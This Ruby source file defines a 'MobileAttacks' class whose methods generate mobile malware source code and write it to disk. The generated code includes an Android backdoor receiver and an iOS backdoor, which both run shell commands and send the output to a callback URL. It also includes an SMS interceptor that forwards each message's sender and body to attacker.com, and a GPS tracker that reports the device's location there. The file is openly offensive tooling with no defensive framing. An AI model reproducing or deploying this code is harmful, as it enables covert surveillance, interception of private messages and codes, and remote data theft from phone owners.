require 'uri'
require 'net/http'
require_relative '../utils/network'
require_relative '../utils/colorize'

class MobileAttacks
  def self.generate_android_apk_backdoor(package_name, callback_url)
    backdoor = <<~JAVA
      package #{package_name};
      
      import android.content.BroadcastReceiver;
      import android.content.Context;
      import android.content.Intent;
      import android.os.AsyncTask;
      import java.io.BufferedReader;
      import java.io.InputStreamReader;
      import java.net.HttpURLConnection;
      import java.net.URL;
      
      public class BackdoorReceiver extends BroadcastReceiver {
          private static final String CALLBACK_URL = "#{callback_url}";
          
          @Override
          public void onReceive(Context context, Intent intent) {
              new AsyncTask<Void, Void, String>() {
                  @Override
                  protected String doInBackground(Void... voids) {
                      try {
                          Process process = Runtime.getRuntime().exec("id");
                          BufferedReader reader = new BufferedReader(
                              new InputStreamReader(process.getInputStream()));
                          StringBuilder result = new StringBuilder();
                          String line;
                          while ((line = reader.readLine()) != null) {
                              result.append(line);
                          }
                          
                          URL url = new URL(CALLBACK_URL + "?data=" + 
                              java.net.URLEncoder.encode(result.toString(), "UTF-8"));
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("GET");
                          conn.getResponseCode();
                      } catch (Exception e) {
                          e.printStackTrace();
                      }
                      return null;
                  }
              }.execute();
          }
      }
    JAVA
    
    filename = "android_backdoor_#{Time.now.to_i}.java"
    File.write(filename, backdoor)
    puts Colorize.green("Android backdoor saved: #{filename}")
    filename
  end

  def self.generate_ios_ipa_backdoor(callback_url)
    backdoor = <<~OBJC
      #import <Foundation/Foundation.h>
      
      @interface Backdoor : NSObject
      @end
      
      @implementation Backdoor
      
      + (void)execute {
          NSString *callback = @"#{callback_url}";
          NSTask *task = [[NSTask alloc] init];
          task.launchPath = @"/bin/sh";
          task.arguments = @[@"-c", @"id"];
          
          NSPipe *pipe = [NSPipe pipe];
          task.standardOutput = pipe;
          [task launch];
          
          NSData *data = [[pipe fileHandleForReading] readDataToEndOfFile];
          NSString *output = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
          
          NSString *urlString = [NSString stringWithFormat:@"%@?data=%@", 
              callback, [output stringByAddingPercentEncodingWithAllowedCharacters:
              [NSCharacterSet URLQueryAllowedCharacterSet]]];
          
          NSURL *url = [NSURL URLWithString:urlString];
          [[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:nil];
      }
      
      @end
    OBJC
    
    filename = "ios_backdoor_#{Time.now.to_i}.m"
    File.write(filename, backdoor)
    puts Colorize.green("iOS backdoor saved: #{filename}")
    filename
  end

  def self.generate_sms_interceptor
    interceptor = <<~JAVA
      import android.content.BroadcastReceiver;
      import android.content.Context;
      import android.content.Intent;
      import android.telephony.SmsMessage;
      import java.net.HttpURLConnection;
      import java.net.URL;
      
      public class SMSInterceptor extends BroadcastReceiver {
          @Override
          public void onReceive(Context context, Intent intent) {
              Object[] pdus = (Object[]) intent.getExtras().get("pdus");
              for (Object pdu : pdus) {
                  SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
                  String sender = message.getOriginatingAddress();
                  String body = message.getMessageBody();
                  
                  new Thread(() -> {
                      try {
                          URL url = new URL("http://attacker.com/sms?from=" + 
                              sender + "&body=" + body);
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("GET");
                          conn.getResponseCode();
                      } catch (Exception e) {
                          e.printStackTrace();
                      }
                  }).start();
              }
          }
      }
    JAVA
    
    filename = "sms_interceptor_#{Time.now.to_i}.java"
    File.write(filename, interceptor)
    puts Colorize.green("SMS interceptor saved: #{filename}")
    filename
  end

  def self.generate_location_tracker
    tracker = <<~JAVA
      import android.content.Context;
      import android.location.Location;
      import android.location.LocationListener;
      import android.location.LocationManager;
      import java.net.HttpURLConnection;
      import java.net.URL;
      
      public class LocationTracker implements LocationListener {
          private static final String CALLBACK_URL = "http://attacker.com/location";
          
          public void startTracking(Context context) {
              LocationManager lm = (LocationManager) context.getSystemService(
                  Context.LOCATION_SERVICE);
              lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, this);
          }
          
          @Override
          public void onLocationChanged(Location location) {
              double lat = location.getLatitude();
              double lon = location.getLongitude();
              
              new Thread(() -> {
                  try {
                      String urlString = CALLBACK_URL + "?lat=" + lat + "&lon=" + lon;
                      URL url = new URL(urlString);
                      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                      conn.setRequestMethod("GET");
                      conn.getResponseCode();
                  } catch (Exception e) {
                      e.printStackTrace();
                  }
              }).start();
          }
      }
    JAVA
    
    filename = "location_tracker_#{Time.now.to_i}.java"
    File.write(filename, tracker)
    puts Colorize.green("Location tracker saved: #{filename}")
    filename
  end
end

